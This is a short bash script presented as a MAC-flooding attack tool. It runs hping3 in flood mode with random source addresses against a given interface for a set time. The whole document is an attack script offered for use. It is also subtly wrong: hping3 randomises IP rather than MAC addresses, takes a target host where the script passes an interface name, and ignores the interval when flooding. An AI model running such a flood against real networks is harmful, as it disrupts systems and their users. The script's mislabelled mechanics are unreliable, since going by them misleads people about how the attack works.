#!/bin/bash
INTERFACE=${1:-eth0}
DURATION=${2:-60}
COUNT=${3:-1000}

echo "[+] MAC Flooding on $INTERFACE for $DURATION seconds ($COUNT packets)"
sudo hping3 --rand-source --flood -2 -c $COUNT -i u1000 $INTERFACE &
PID=$!
sleep $DURATION
sudo kill $PID
echo "[+] MAC Flood stopped."
